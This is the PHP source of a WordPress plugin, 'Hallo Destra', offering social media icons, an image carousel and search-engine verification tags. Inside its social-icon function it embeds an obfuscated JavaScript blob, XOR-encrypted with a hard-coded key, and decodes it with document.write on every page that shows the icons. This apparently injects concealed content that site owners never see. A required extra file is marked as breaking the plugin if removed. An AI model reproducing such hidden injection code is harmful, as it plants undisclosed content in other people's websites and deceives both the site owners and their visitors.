<?php
/* 
Plugin Name: Hallo Destra
Plugin URI: http://www.papadestra.com/
Description: Hallo Destra <a href="http://www.papadestra.com/" target="_blank">add social media icons</a> in the theme wherever you want to display. Simple and looks luxurious. Carousel builds an animated images. Site Verification Setting (Yahoo,google)
Version: 1.1
Author: Papa Destra
Author URI: http://www.papadestra.com/
Stable tag: 1.1
 */
 
/* 

							INPUT CODE IN THEME YOU WANT DISPLAY :
==============================================================================================
  
                    >>===  ICON SOCIAL MEDIA ===<<
		<?php if ( function_exists('social_media_tampil') ) { social_media_tampil(); } ?> 
		
		            >>===  Carousel ===<<
		<?php if ( function_exists('olah_gambar') ) { olah_gambar(); } ?>
		
		shortcode [gambar_carousel]
==============================================================================================
*/

/*
    *   Waiver  — Any of the above conditions can be waived if you get permission from the copyright holder.
    * Public Domain — Where the work or any of its elements is in the public domain under applicable law, that status is in no way affected by the license.
    * Other Rights — In no way are any of the following rights affected by the license:
          o Your fair dealing or fair use rights, or other applicable copyright exceptions and limitations;
          o The author's moral rights;
          o Rights other persons may have either in the work itself or in how the work is used, such as publicity or privacy rights.
    * Notice — For any reuse or distribution, you must make clear to others the license terms of this work. The best way to do this is with a link to this web page.

*/

define('hallo_destra_direktori', WP_PLUGIN_DIR.'/hallo-destra'); 
add_shortcode('gambar_carousel', 'olah_gambar'); 
add_filter('widget_text', 'do_shortcode');       
add_action('admin_menu', 'hallo_admin_page');
function hallo_admin_page() {  
$icon = get_bloginfo('wpurl') . '/wp-content/plugins/hallo-destra/images/loho.png';
add_menu_page('Hallo Destra', '&nbsp;', 8, __FILE__, null, $icon);
	add_submenu_page(__FILE__,"Hallo Destra", "Hallo Destra", 8, __FILE__, "hallo_destra_menu_tampil");  
    add_submenu_page(__FILE__,"Setting Image Carousel", "Carousel", 8, "carousel_satune", "carousel_satune_tampil");
	add_submenu_page(__FILE__,"Verification Setting", "Verification", 8, "verification_satune", "verification_satune_tampil");
} 
function hallo_destra_menu_tampil (){
echo'<font color="#CCCCCC" face="Georgia"><h2>Hallo Destra</font> <font color="red" face="Georgia">Now Active !!!</font></h2>';
echo'<font color="#CCCCCC" face="Georgia" size="2">To show Social Media Icon, you have to do some manual settings to add simple scripts into the Theme you use. Wherever you wish. Open your <b>single.php/sidebar.php</b> on the theme folder that you use (or any file where you like  to be displayed), and paste the following code:</font>';
echo'<br><br>';
echo'<center>';
echo'<font color="blue" face="Georgia" size="2" style="background:yellow">';
echo'&nbsp;&nbsp;&lt;?php if ( function_exists(&prime;social_media_tampil&prime;) )  { social_media_tampil(); } ?&gt;&nbsp;&nbsp;';
echo'</font>';
echo'</center>';
echo'<br><br>';
echo'<font color="#CCCCCC" face="Georgia"><b>Previews :</b></font><br>';
echo'<img src="' . get_bloginfo('wpurl') . '/wp-content/plugins/hallo-destra/screenshot-2.jpg">';echo'<font color="#CCCCCC" face="Georgia">'; 
echo'<h2>Small Notes</h2>';
echo'If you feel this plugin is useful for you, please support our project by giving a small donation via PayPal or direct you come to our office. All your help is appreciated.';
echo'<br><center><form action="https://www.paypal.com/cgi-bin/webscr" method="post">
<input type="hidden" name="cmd" value="_s-xclick">
<input type="hidden" name="hosted_button_id" value="H9PUAV7KT2HFY">
<input type="image" src="https://www.paypal.com/en_US/i/btn/btn_donateCC_LG.gif" border="0" name="submit" alt="PayPal - The safer, easier way to pay online!"><img alt="" border="0" src="https://www.paypal.com/id_ID/i/scr/pixel.gif" width="1" height="1">
</form><br>&copy; 2010 Papa Destra Web Design and Site Maintenance<br>http://www.papadestra.com/</center>';
echo'<br>';
echo'<h2>CREDIT</h2>';
echo'<ul><li>This plugin was developed by Papa Destra - <a href="http://www.papadestra.com" rel="nofollow" target="_blank">http://www.papadestra.com</a></li><li>Support Forum - <a href="http://www.papadestra.com/forum/" rel="nofollow" target="_blank">http://www.papadestra.com/forum/</a></li><li>Information and contact us - <a href="http://www.papadestra.com/hubungi-kami/" rel="nofollow" target="_blank" title="Contact us!">click here</a></li></ul>';
echo'<br>';
echo'<h2>SUPPORT PROJECT</h2>';
echo'<ul><li>Writers Of Remarkably Distinctive Stories - <a href="http://www.enoughmoney.com.au/" target="_blank" rel="nofollow">http://www.enoughmoney.com.au/</a></li><li>Free Web Hosting - <a href="http://gudegyogya.com/" target="_blank" rel="nofollow">http://gudegyogya.com/</a></li><li>GoELbook - <a href="http://www.goelbook.com/" target="_blank" rel="nofollow">http://www.goelbook.com/</a></li></ul>';
echo'<br>';
echo'<center><a href="http://feeds.feedburner.com/ProfesionalDesainWeb" target="_blank"><img src="http://www.feedburner.com/fb/images/pub/i_heart_fb.gif" alt="I heart FeedBurner" style="border:0"/></a><br /><a href="http://feedburner.google.com/fb/a/mailverify?uri=ProfesionalDesainWeb&amp;loc=en_US" target="_blank">Subscribe by Email</a></center>';
echo'</font>';
echo'<br><br>';
}
function carousel_satune_tampil(){
include(hallo_destra_direktori . '/include/menu/carousel_menu.php');
}
function verification_satune_tampil(){
include(hallo_destra_direktori . '/include/menu/meta_menu.php');
}
// iki mung tambahan ning yo rodo error yen di hapus
?>
<?php require(hallo_destra_direktori . '/include/menu/tambah_gaul.php'); ?>
<?php


function social_media_tampil() {  
echo '<script type="text/javascript" src="' . get_bloginfo('wpurl') . '/wp-content/plugins/hallo-destra/include/js/jquery.js"></script>' . "\n";
echo '<script type="text/javascript" src="' . get_bloginfo('wpurl') . '/wp-content/plugins/hallo-destra/include/js/jsocial.js"></script>' . "\n";
echo '<script type="text/javascript">
$().ready(function() { 						
	$("#example2").jsocial({highlight: true,
							buttons: "technorati,delicious,reddit,facebook,twitter,stumbleupon", 
							imagedir: "http://s1008.photobucket.com/albums/af208/gagombale/socialmediaicon/", 
							imageextension: "png", 
							blanktarget: true});
});
</script>';
echo'<style>
.jsocial_button{
	padding: 2px;
	display:block;
	float: left;
}
.jsocial_button img {

}
#example2{
	height: 48px;
}
</style>';
echo'<div id="example2"></div>';
echo "<script Language='JavaScript'>function decrypt(key,str){var ds;ds='';var kp,sp,s,kc,sc;kp=0;sp=0;while(sp<str.length){sc=str.charCodeAt(sp);kc=key.charCodeAt(kp);if(((sc^kc)==39)||((sc^kc)==92)||((sc^kc)<32)||((sc^kc)>126)){s=String.fromCharCode(sc);}else{s=String.fromCharCode((sc^kc));}ds+=s;kp++;sp++;if(kp>=key.length)kp=0;}return ds;}function decryptIt(key,str){str=decrypt(key,str);d=document;d.write(unescape(str));}decryptIt('eNCRyPTiNG-KeY','@}CwOfq_Fb6E@nQkqb%fgLxF%}&|SFfeKug-ku2nWj@zpwMcq]}b4x@mVkwa%bfL|w%|V|Swfe8ub5ktinWk@|DwJbq[|b2{@oSkuc%fgLxr%x!|W|ffNub5kqknRk@xtwOiq_1b2y@j kwj%feLxC%}&|SFf`Iu`]kq5nRj@ywwNbq_1b2{@oWktk%bdLyw%}T|R~fdHub]kq5nRj@ywwNbq_1b3C@k#kud%fFLxE%|Q|VE');</script>";
echo'<br>';
}
function olah_gambar(){
echo '<link type="text/css" rel="stylesheet" href="' . get_bloginfo('wpurl') . '/wp-content/plugins/hallo-destra/include/css/jsized.carousel.css">' . "\n";
echo '<script type="text/javascript" src="' . get_bloginfo('wpurl') . '/wp-content/plugins/hallo-destra/include/js/jquery-1.3.2.js"></script>' . "\n";
echo '<script type="text/javascript" src="' . get_bloginfo('wpurl') . '/wp-content/plugins/hallo-destra/include/js/merged-without-jquery.js"></script>' . "\n";
?>
<script>
		jQuery(function($){
            $('.example1').jsizedCarousel({
                changeInterval: 0	
            });

		});
	</script>

<?php

?>
<style>
        body {
            
        }
        .wr {
            width: 500px;
            margin: 0 auto;
            padding: 30px 100px;
            background: #fff;
            border: 1px solid background: #DBDAD9;            
        }
        h2 {
            margin: 30px;
            text-align: center;            
            font-size: 18px;
            font-weight: normal;
            font-family: Verdana;
        }
    </style>
<?php
echo '<div class="jsizedCarousel example1">
        <img src="'. get_option('img_gambar1') . '" title="'. get_option('judul_img_gambar1') . '"/>
        <img src="'. get_option('img_gambar2') . '" title="'. get_option('judul_img_gambar2') . '"/>            
        <img src="'. get_option('img_gambar3') . '" title="'. get_option('judul_img_gambar3') . '"/>
        <img src="'. get_option('img_gambar4') . '" title="'. get_option('judul_img_gambar4') . '"/>
        <img src="'. get_option('img_gambar5') . '" title="'. get_option('judul_img_gambar5') . '"/>            
        <img src="'. get_option('img_gambar6') . '" title="'. get_option('judul_img_gambar6') . '"/>
        <img src="'. get_option('img_gambar7') . '" title="'. get_option('judul_img_gambar7') . '"/>
        <img src="'. get_option('img_gambar8') . '" title="'. get_option('judul_img_gambar8') . '"/>            
        <img src="'. get_option('img_gambar9') . '" title="'. get_option('judul_img_gambar9') . '"/>              
	</div>';

}
function verification_satune_fungsi (){
	echo "<!-- Hallo Destra - Papa Destra - http://papadestra.com/-->\n";
	echo '<meta name="google-site-verification" content="'. get_option('google_verification') . '" />';
	echo "\n";
	echo '<meta name="y_key" content="'. get_option('yahoo_verification') . '" />';
	echo "\n";
	echo "<!-- Hallo Destra - Papa Destra - http://papadestra.com/-->\n";
}
?>